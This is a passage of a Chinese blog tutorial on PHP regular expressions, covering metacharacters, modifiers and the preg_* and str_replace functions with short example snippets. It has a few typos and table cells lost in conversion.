title="正则表达式中常用的“通用字符类型”"></a>正则表达式中常用的“通用字符类型”</h4><table><thead><tr><th><strong>原子字符</strong></th><th><strong>含义描述</strong></th></tr></thead><tbody><tr><td><strong>\d</strong></td><td>匹配任意一个十进制数字，等价于[0-9]</td></tr><tr><td><strong>\D</strong></td><td>匹配任意一个除十进制数字以外的字符，等价于[^0-9]</td></tr><tr><td><strong>\s</strong></td><td>匹配任意一个空白符，等价于[\f\n\r\t\v]</td></tr><tr><td><strong>\S</strong></td><td>匹配除空白符以外任何字符，等价于[^\f\n\r\t\v]</td></tr><tr><td><strong>\w</strong></td><td>匹配任意一个数字、字母或下画线，等价于[0-9a-zA-Z_]</td></tr><tr><td><strong>\W</strong></td><td>匹配一个除数字、字母或下画线以外的任意一个字符，等价于[^0-9a-zA-Z_]</td></tr></tbody></table><h3 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h3><table><thead><tr><th><strong>元字符</strong></th><th><strong>含义描述</strong></th></tr></thead><tbody><tr><td>*****</td><td>匹配0次、1次或多次其前的原子</td></tr><tr><td><strong>+</strong></td><td>匹配1次或多次其前的原子</td></tr><tr><td><strong>？</strong></td><td>匹配0次或1次其前的原子</td></tr><tr><td><strong>.</strong></td><td>匹配除了换行符外的任意一个字符</td></tr><tr><td>**</td><td>**</td></tr><tr><td><strong>{n}</strong></td><td>表示其前面的原子恰好出现n次</td></tr><tr><td><strong>{n,}</strong></td><td>表示其前面的原子出现不小于n次</td></tr><tr><td><strong>{n,m}</strong></td><td>表示其前面的原子至少出现n次，最多出现m次</td></tr><tr><td><strong>^或\A</strong></td><td>匹配输入字符串的开始位置（或在多行模式下行的开头，即紧随一个换行符之后）</td></tr><tr><td><strong>$或\Z</strong></td><td>匹配输入字符串的结束位置（或在多行模式下行的结尾，即紧随一个换行符之前）</td></tr><tr><td><strong>\b</strong></td><td>匹配单词的边界</td></tr><tr><td><strong>\B</strong></td><td>匹配除单词边界以外的部分</td></tr><tr><td><strong>[]</strong></td><td>匹配方括号中指定的任意一个原子</td></tr><tr><td><strong>[^]</strong></td><td>匹配除方括号中的原子以外的任意一个字符</td></tr><tr><td><strong>( )</strong></td><td>匹配其整体为一个原子，即模式单元。可以理解为由多个单个原子组成的大原子</td></tr></tbody></table><h4 id="字符串边界限制"><a href="#字符串边界限制" class="headerlink" title="字符串边界限制"></a>字符串边界限制</h4><ul><li><code>^</code>：指定字符串的开始</li><li><code>&amp;</code>：指定支付的结束<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/^apple/&#x27;</span>;//^匹配字符串开头为apple</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/apple$/&#x27;</span>;//$匹配字符串结尾为apple</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/^apple$/&#x27;</span>;//完全匹配字符串是apple</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/apple/&#x27;</span>;//模糊匹配字符串含有apple</span><br><span class="line">preg_match(<span class="variable">$check</span>, <span class="string">&#x27;apple&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">var_dump(<span class="variable">$info</span>);//输出array(1) &#123; [0]=&gt; string(5) <span class="string">&quot;apple&quot;</span> &#125;</span><br></pre></td></tr></table></figure><h4 id="单词边界限制"><a href="#单词边界限制" class="headerlink" title="单词边界限制"></a>单词边界限制</h4><blockquote><p>在使用各种编辑软件的查找功能时，可以通过选择“按单词查找”获得更准确的结果。正则表达式中也提供类似的功能。</p></blockquote></li></ul><p>例如：在字符串“This island is a beautiful land”中</p><ul><li><p><code>\b</code>：对单词的边界进行匹配</p></li><li><p><code>\B</code>：对除单词边界以外的部分进行匹配</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/\bis\b/&#x27;</span>;//完全匹配单词is</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/\bis/&#x27;</span>;//匹配单词is开头的</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/\Bis\B/&#x27;</span>;//不与单词的左、右边界匹配，只匹配单词的内部。</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/\Bis/&#x27;</span>;//匹配非is开头的单词</span><br><span class="line">preg_match_all(<span class="variable">$check</span>, <span class="string">&#x27;This island is a beautiful land&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">var_dump(<span class="variable">$info</span>);</span><br></pre></td></tr></table></figure><h4 id="重复匹配"><a href="#重复匹配" class="headerlink" title="重复匹配"></a>重复匹配</h4><blockquote><p>正则表达式中有一些用于重复匹配某些原子的元字符：“?”、“*”、“+”。他们主要的区别是重复匹配的次数不同。</p></blockquote></li><li><p><code>?</code>：表示0次或1次匹配紧接在其前的原子</p></li><li><p><code>*</code>：表示0次、1次或多次匹配紧接在其前的原子</p></li><li><p><code>+</code>：表示1次或多次匹配紧接在其前的原子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/Th?is/&#x27;</span>;//匹配Tis,This</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/Th*is/&#x27;</span>;//匹配Tis,This,Thhis等</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/Th+is/&#x27;</span>;//匹配This,Thhis等</span><br><span class="line">preg_match(<span class="variable">$check</span>, <span class="string">&#x27;This&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">var_dump(<span class="variable">$info</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>&#123;&#125;</code>：准确的指定原子重复的次数，指定匹配所匹配的原子出现的次数</p><ul><li><code>&#123;m&#125;</code>：表示其前原子恰好出现m次</li><li><code>&#123;m,n&#125;</code>：表示其前原子至少出现m次，至多出现n次</li><li><code>&#123;m,&#125;</code>：表示其前原子出现不少于m次<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/This&#123;1&#125;/&#x27;</span>;//匹配This</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/This&#123;1,2&#125;/&#x27;</span>;//匹配This或Thiss</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/This&#123;1,&#125;/&#x27;</span>;//匹配This...</span><br><span class="line">preg_match(<span class="variable">$check</span>, <span class="string">&#x27;Thissss&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">var_dump(<span class="variable">$info</span>);</span><br></pre></td></tr></table></figure><h4 id="任何一个字符"><a href="#任何一个字符" class="headerlink" title="任何一个字符"></a>任何一个字符</h4></li></ul></li><li><p><code>.</code>：匹配除换行符外任何一个字符</p><blockquote><p>通常可以使用“.*”组合来匹配除换行符外的任何字符。</p></blockquote></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/^a.*z$/&#x27;</span>;//匹配字母a开头,z结尾的任意不包含换行符的字符串</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/^a.+z$/&#x27;</span>;//匹配字母a开头,z结尾的三个字符串,不匹配<span class="string">&quot;az&quot;</span></span><br><span class="line">preg_match(<span class="variable">$check</span>, <span class="string">&#x27;aasdasdsaz&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">var_dump(<span class="variable">$info</span>);</span><br></pre></td></tr></table></figure><h4 id="方括号表达式"><a href="#方括号表达式" class="headerlink" title="方括号表达式"></a>方括号表达式</h4><ul><li><code>[]</code>：存放一组原子，彼此地位平等，仅匹配其中的一个原子。例如想匹配一个<code>a</code>或<code>e</code>，使用<code>[ae]</code>。<ul><li>例如:<code>Pr[ae]y</code> 匹配 <code>Pray</code>或者 <code>Prey</code>。</li></ul></li><li><code>[^]</code>：排除原子表，匹配除表内原子外的任意一个字符。<ul><li>例如：<code>/p[^u]/</code>匹配<code>part</code>中的<code>pa</code>，但无法匹配<code>computer</code>中的<code>pu</code>因为<code>u</code>在匹配中被排除。</li></ul></li><li><code>[-]</code>：用于连接一组按<code>ASCII</code>码顺序排序的原子，简化书写。<ul><li>例如：<code>/x[0123456789]/</code>可以写成<code>x[0-9]</code>,用来匹配一个由 <code>x</code> 字母与一个数字组成的字符串。<blockquote><p>其他常用的匹配：<br>/[a-zA-Z]/匹配所有大小写字母<br>/^[a-z][0-9]$/匹配比如“z2”、 “t6” 、“g7”<br>/0[xX][0-9a-fA-F]/匹配一个简单的十六进制数字，如“0x9”。<br>/[^0-9a-zA-Z_]/匹配除英文字母、数字和下划线以外任何一个字符，其等价于\W。  <br>/0?[ xX][0-9a-fA-F]+/匹配十六进制数字，可以匹配“0x9B3C”或者“X800”等。<br>/&lt;[A-Za-z][A-Za-z0-9]*&gt;/可以匹配“<P>”、“<hl>”或“<Body>”等HTML标签，并且不严格的控制大小写。</p></blockquote></li></ul></li></ul><h4 id="模式选择符"><a href="#模式选择符" class="headerlink" title="模式选择符"></a>模式选择符</h4><ul><li><p><code>|</code>：在正则表达式中匹配两个或更多的选择之一</p><ul><li>例如：在字符串<code>There are many apples and pears</code>中， <code>/apple|pear/</code>在第一次运行时匹配<code>apple</code>，再次运行时匹配<code>pear</code>。也可以继续增加选项，如：<code>/apple|pear|banana|lemon/</code><h4 id="模式单元符"><a href="#模式单元符" class="headerlink" title="模式单元符"></a>模式单元符</h4></li></ul></li><li><p><code>()</code>：将其中的正则表达式变为原子（或称模式单元）使用，与数学表达式中的括号类似。</p><ul><li>例1：<code>/(Dog)+/</code>匹配的<code>Dog</code>、<code>DogDog</code>、<code>DogDogDog</code>,因为紧接着<code>+</code>前的原子是元字符<code>()</code>括起来的字符串<code>Dog</code>。</li><li>例2：<code>/Hello (world|earth)/</code>匹配<code>Hello world</code>、<code>Hello earth</code>。<blockquote><p>一个模式单元中的表达式将被优先匹配或运算。</p></blockquote></li></ul></li></ul><h5 id="重新使用的模式单元"><a href="#重新使用的模式单元" class="headerlink" title="重新使用的模式单元"></a>重新使用的模式单元</h5><p>系统自动将模式单元<code>()</code>中的匹配依次存储起来，在需要时可以用<code>\1</code>、<code>\2</code>、<code>\3</code>的形式进行引用。当正则表达式包含有相同的模式单元时，这种方法非常便于对其进行管理。注意使用时需要写成<code>\\1</code>、<code>\\2</code></p><ul><li>例如：<code>/^\d&#123;2&#125;([\W])\d&#123;2&#125;\\1\d&#123;4&#125;$/</code>匹配<code>12-31-2006</code>、<code>09/27/1996</code>、<code>86 01 4321</code>等字符串。但上述正则表达式不匹配<code>12/34-5678</code>的格式。这是因为模式<code>[\W]</code>的结果<code>/</code>已经被存储。下个位置<code>\1</code>引用时，其匹配模式也是字符<code>/</code>。</li></ul><p>当不需要存储匹配结果时使用非存储模式单元<code>(?:)</code></p><ul><li>例如：<code>/(?:a|b|c)(D|E|F)\\1g/</code> 将匹配<code>aEEg</code>。在一些正则表达式中，使用非存储模式单元是必要的。否则，需要改变其后引用的顺序。上例还可以写成<code>/(a|b|c)(C|E|F)\\2g/</code>。<h4 id="模式匹配的优先级"><a href="#模式匹配的优先级" class="headerlink" title="模式匹配的优先级"></a>模式匹配的优先级</h4></li></ul><table><thead><tr><th><strong>顺序</strong></th><th><strong>元字符</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>1</strong></td><td><strong>\</strong></td><td>转义字符</td></tr><tr><td><strong>2</strong></td><td><strong>()  (?:)  (?=)    []</strong></td><td>模式单元和原子表</td></tr><tr><td><strong>3</strong></td><td>***  +   ?    {n}  {n,} {n,m}**</td><td>重复匹配</td></tr><tr><td><strong>4</strong></td><td><strong>^  $  \b    \B  \A   \Z</strong></td><td>边界限制</td></tr><tr><td><strong>5</strong></td><td>**</td><td>**</td></tr></tbody></table><h3 id="模式修正符"><a href="#模式修正符" class="headerlink" title="模式修正符"></a>模式修正符</h3><table><thead><tr><th><strong>修正符</strong></th><th><strong>含义描述</strong></th></tr></thead><tbody><tr><td><strong>i</strong></td><td>在和模式进行匹配时不区分大小写</td></tr><tr><td><strong>m</strong></td><td>将字符串视为多行。默认的正则开始“^”和结束“$”将目标字符串作为单一的一“行”字符。加上m后，那么开始和结束将会指字符串的每一行。</td></tr><tr><td><strong>s</strong></td><td>如果设定了此修正符，模式中的圆点元字符“.”匹配所有的字符，包括换行符。即将字符串视为单行，换行符作为普通字符看待</td></tr><tr><td><strong>x</strong></td><td>模式中的空白忽略不计，除非它已经被转义</td></tr><tr><td><strong>e</strong></td><td>只用在preg_replace()函数中，在替换字符串中对逆向引用做正常的替换，将其作为  PHP 代码求值，并用其结果来替换所搜索的字符串。</td></tr><tr><td><strong>U</strong></td><td>本修正符反转了匹配数量的值使其不是默认的重复，而变成在后面跟上“?”才变得重复。这和  Perl 不兼容。也可以通过在模式之中设定  (U) 修正符或者在数量符之后跟一个问号（如启.*?）来用此选项。</td></tr><tr><td><strong>D</strong></td><td>模式中的美元元字符仅匹配目标字符串的结尾。没有此选项时，如果最后一个字符是换行符的话，美元符号也会匹配此字符之前。如果设定了  m 修正符则忽略此选项</td></tr></tbody></table><h2 id="与Perl兼容的正则表达式函数"><a href="#与Perl兼容的正则表达式函数" class="headerlink" title="与Perl兼容的正则表达式函数"></a>与Perl兼容的正则表达式函数</h2><h3 id="字符串的匹配和查找函数"><a href="#字符串的匹配和查找函数" class="headerlink" title="字符串的匹配和查找函数"></a>字符串的匹配和查找函数</h3><ul><li><p><code>preg_match()</code>：执行一个正则表达式匹配</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 一个用于匹配URL的正则表达式</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/(https?|ftps?):\/\/(www)\.([^\.\/]+)\.(com|net|org)(\/[\w-\.\/\?\%\&amp;\=]*)?/i&#x27;</span>; </span><br><span class="line">//被搜索字符串</span><br><span class="line"><span class="variable">$subject</span> = <span class="string">&quot;网址为http://www.lampbrother.net/index.php的位置是LAMP兄弟连&quot;</span>;    </span><br><span class="line">//使用preg_match()函数进行匹配</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$pattern</span>, <span class="variable">$subject</span>, <span class="variable">$matches</span>)) &#123;          </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;搜索到的URL为：&quot;</span>.<span class="variable">$matches</span>[0].<span class="string">&quot;&lt;br&gt;&quot;</span>;    //数组中第一个元素保存全部匹配结果</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;URL中的协议为：&quot;</span>.<span class="variable">$matches</span>[1].<span class="string">&quot;&lt;br&gt;&quot;</span>;    //数组中第二个元素保存第一个子表达式</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;URL中的主机为：&quot;</span>.<span class="variable">$matches</span>[2].<span class="string">&quot;&lt;br&gt;&quot;</span>;    //数组中第三个元素保存第二个子表达式</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;URL中的域名为：&quot;</span>.<span class="variable">$matches</span>[3].<span class="string">&quot;&lt;br&gt;&quot;</span>;    //数组中第四个元素保存第三个子表达式</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;URL中的顶域为：&quot;</span>.<span class="variable">$matches</span>[4].<span class="string">&quot;&lt;br&gt;&quot;</span>;    //数组中第五个元素保存第四个子表达式</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;URL中的文件为：&quot;</span>.<span class="variable">$matches</span>[5].<span class="string">&quot;&lt;br&gt;&quot;</span>;    //数组中第六个元素保存第五个子表达式</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;搜索失败！&quot;</span>;                             //如果和正则表达式没有匹配成功则输出</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020111201.png" alt="image"></p></li><li><p><code>preg_match_all()</code>：执行全局正则表达式匹配</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//声明一个可以匹配URL的正则表达式</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/(https?|ftps?):\/\/(www|bbs)\.([^\.\/]+)\.(com|net|org)(\/[\w-\.\/\?\%\&amp;\=]*)?/i&#x27;</span>;  </span><br><span class="line">// //声明一个包含多个URL链接地址的多行文字</span><br><span class="line"><span class="variable">$subject</span> = <span class="string">&quot;网址为http://bbs.lampbrother.net/index.php的位置是LAMP兄弟连，</span></span><br><span class="line"><span class="string">        网址为http://www.baidu.com/index.php的位置是百度，</span></span><br><span class="line"><span class="string">        网址为http://www.google.com/index.php的位置是谷歌。&quot;</span>;</span><br><span class="line"><span class="variable">$i</span> = 1;    //定义一个计数器，用来统计搜索到的结果数</span><br><span class="line">// //搜索全部的结果</span><br><span class="line"><span class="keyword">if</span>(preg_match_all(<span class="variable">$pattern</span>, <span class="variable">$subject</span>, <span class="variable">$matches</span>, PREG_SET_ORDER)) &#123;  </span><br><span class="line">foreach(<span class="variable">$matches</span> as <span class="variable">$urls</span>) &#123;     //循环遍历二维数组<span class="variable">$matches</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;搜索到第&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;个URL为：&quot;</span>.<span class="variable">$urls</span>[0].<span class="string">&quot;&lt;br&gt;&quot;</span>;   </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;个URL中的协议为：&quot;</span>.<span class="variable">$urls</span>[1].<span class="string">&quot;&lt;br&gt;&quot;</span>;   </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;个URL中的主机为：&quot;</span>.<span class="variable">$urls</span>[2].<span class="string">&quot;&lt;br&gt;&quot;</span>;   </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;个URL中的域名为：&quot;</span>.<span class="variable">$urls</span>[3].<span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;个URL中的顶域为：&quot;</span>.<span class="variable">$urls</span>[4].<span class="string">&quot;&lt;br&gt;&quot;</span>;   </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;个URL中的文件为：&quot;</span>.<span class="variable">$urls</span>[5].<span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="variable">$i</span>++;  //计数器累加</span><br><span class="line">&#125;   </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;搜索失败！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020111202.png" alt="tp2020111202.png"></p></li><li><p><code>preg_grep()</code>：返回匹配模式的数组条目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$array</span> = array(<span class="string">&quot;Linux RedHat9.0&quot;</span>, <span class="string">&quot;Apache2.2.9&quot;</span>, <span class="string">&quot;MySQL5.0.51&quot;</span>, <span class="string">&quot;PHP5.2.6&quot;</span>, <span class="string">&quot;LAMP&quot;</span>, <span class="string">&quot;100&quot;</span>);</span><br><span class="line">//返回数组中以字母开始和以数字结束，并且没有空格的单元，赋给变量<span class="variable">$version</span></span><br><span class="line"><span class="variable">$version</span> = preg_grep(<span class="string">&quot;/^[a-zA-Z]+(\d|\.)+$/&quot;</span>, <span class="variable">$array</span>);  </span><br><span class="line">print_r(<span class="variable">$version</span>);      </span><br><span class="line">//输出：Array ( [1] =&gt; Apache2.2.9 [2] =&gt; MySQL5.0.51 [3] =&gt; PHP5.2.6 )</span><br></pre></td></tr></table></figure></li><li><p>其它字符串处理函数：<code>strstr()</code>、<code>strpos()</code>、<code>strrpos()</code>、<code>substr()</code>字符串的替换函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> strstr(<span class="string">&quot;this is a test!&quot;</span>, <span class="string">&quot;test&quot;</span>);     //输出<span class="built_in">test</span>!</span><br><span class="line"><span class="built_in">echo</span> strstr(<span class="string">&quot;this is a test!&quot;</span>, 115);        //搜索 <span class="string">&quot;s&quot;</span> 的ASCII值所代表的字符输出s is a <span class="built_in">test</span>!</span><br></pre></td></tr></table></figure><h3 id="字符串替换函数"><a href="#字符串替换函数" class="headerlink" title="字符串替换函数"></a>字符串替换函数</h3><h4 id="preg-replace：执行一个正则表达式的搜索和替换"><a href="#preg-replace：执行一个正则表达式的搜索和替换" class="headerlink" title="preg_replace：执行一个正则表达式的搜索和替换"></a>preg_replace：执行一个正则表达式的搜索和替换</h4></li><li><p>示例1：替换HTML标记</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//可以匹配所有HTML标记的开始和结束的正则表达式</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;/&lt;[\/\!]*?[^&lt;&gt;]*?&gt;/is&quot;</span>;             </span><br><span class="line"></span><br><span class="line">//声明一个带有多个HTML标记的文本</span><br><span class="line"><span class="variable">$text</span> = <span class="string">&quot;这个文本中有&lt;b&gt;粗体&lt;/b&gt;和&lt;u&gt;带有下画线&lt;/u&gt;以及&lt;i&gt;斜体&lt;/i&gt;</span></span><br><span class="line"><span class="string">         还有&lt;font color=&#x27;red&#x27; size=&#x27;7&#x27;&gt;带有颜色和字体大小&lt;/font&gt;的标记&quot;</span>;        </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$text</span>; </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">//将所有HTML标记替换为空，即删除所有HTML标记</span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="variable">$pattern</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$text</span>);     </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">//通过第四个参数传入数字2，替换前两个HTML标记</span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="variable">$pattern</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$text</span>, 2);  </span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020111203.png" alt="tp2020111203.png"></p></li><li><p>示例2：替换日期格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;/(\d&#123;2&#125;)\/(\d&#123;2&#125;)\/(\d&#123;4&#125;)/&quot;</span>; //日期格式的正则表达式</span><br><span class="line"><span class="variable">$text</span>=<span class="string">&quot;今年国庆节放假日期为10/01/2012到10/07/2012共7天。&quot;</span>; //带有两个日期格式的字串</span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="variable">$pattern</span>, <span class="string">&quot;\\3-\\1-\\2&quot;</span>, <span class="variable">$text</span>); //将日期替换为以“-”分隔的格式</span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="variable">$pattern</span>, <span class="string">&quot;\$&#123;3&#125;-\$&#123;1&#125;-\$&#123;2&#125;&quot;</span>,<span class="variable">$text</span>); //将“\\1”改为“\<span class="variable">$&#123;1&#125;</span>”的形式</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020111204.png" alt="tp2020111204.png"></p><h4 id="str-replace-：-子字符串替换"><a href="#str-replace-：-子字符串替换" class="headerlink" title="str_replace ： 子字符串替换"></a>str_replace ： 子字符串替换</h4><p>该函数返回一个字符串或者数组。通过<code>$count</code>参数指定来获取替换的次数。</p></li><li><p>示例1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//声明包含多个“LAMP”字符串的文本，也包含小写的“lamp”字符串</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;LAMP是目前最流行的WEB开发平台；&lt;br&gt;LAMP为B/S架构软件开发的黄金组合；&lt;br&gt;LAMP每个成员都是开源软件；&lt;br&gt;lampBrother是LAMP的技术社区。&lt;br&gt;&quot;</span>;</span><br><span class="line">//区分大小写的将“LAMP”替换为“Linux+Apache+MySQL+PHP”，并统计替换次数</span><br><span class="line"><span class="built_in">echo</span> str_replace(<span class="string">&quot;LAMP&quot;</span>, <span class="string">&quot;Linux+Apache+MySQL+PHP&quot;</span>,<span class="variable">$str</span>, <span class="variable">$count</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;区分大小写时共替换&quot;</span>.<span class="variable">$count</span>.<span class="string">&quot;次&lt;br&gt;&quot;</span>;    //替换4次</span><br><span class="line">//不区分大小写的将“LAMP”替换为“Linux+Apache+MySQL+PHP”，并统计替换次数</span><br><span class="line"><span class="built_in">echo</span> str_ireplace(<span class="string">&quot;LAMP&quot;</span>, <span class="string">&quot;Linux+Apache+MySQL+PHP&quot;</span>, <span class="variable">$str</span>,<span class="variable">$count</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;不区分大小写时共替换&quot;</span>.<span class="variable">$count</span>.<span class="string">&quot;次&lt;br&gt;&quot;</span>;    //替换5次</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020111205.png" alt="tp2020111205.png"></p></li><li><p>示例2：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//元音字符数组</span><br><span class="line"><span class="variable">$vowels</span> = array(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;U&quot;</span>);  </span><br><span class="line">//将第三个参数中的字符串，搜索到的数组中的元素值都被替换为空，区分大写小替换</span><br><span class="line"><span class="built_in">echo</span> str_replace(<span class="variable">$vowels</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Hello World of PHP&quot;</span>);  //输出: Hll Wrld f PHP</span><br><span class="line">//元音字符数组</span><br><span class="line"><span class="variable">$vowels</span> = array(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;u&quot;</span>);                           </span><br><span class="line">//将第三个参数中的字符串，搜索到的数组中的元素值都被替换为空，不区分大写小替换</span><br><span class="line"><span class="built_in">echo</span> str_ireplace(<span class="variable">$vowels</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;HELLO WORLD OF PHP&quot;</span>); //输出：HLL WRLD F PHP</span><br></pre></td></tr></table></figure><h3 id="字符串的分割与连接"><a href="#字符串的分割与连接" class="headerlink" title="字符串的分割与连接"></a>字符串的分割与连接</h3><h4 id="preg-split：通过一个正则表达式分隔字符串"><a href="#preg-split：通过一个正则表达式分隔字符串" class="headerlink" 